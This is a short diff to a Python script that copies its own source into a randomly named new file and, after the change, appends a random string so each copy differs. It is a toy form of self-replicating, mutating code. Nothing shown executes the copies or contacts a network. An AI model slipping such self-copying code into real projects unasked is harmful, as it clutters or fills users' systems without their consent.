@@ -14,13 +14,13 @@ thisfile = os.path.basename(__file__)
 f = open(thisfile, "r")
 lines = f.readlines()
 
-filename = "newpython{randomness}.py".format(randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=100)))
+filename = "newpython{randomness}.py".format(randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))
 
 g = open(filename, "w")
 for line in lines:
     g.write(line)
 
-g.write('\n'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=100))))
+g.write('\n{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
 g.close()
 f.close()
 
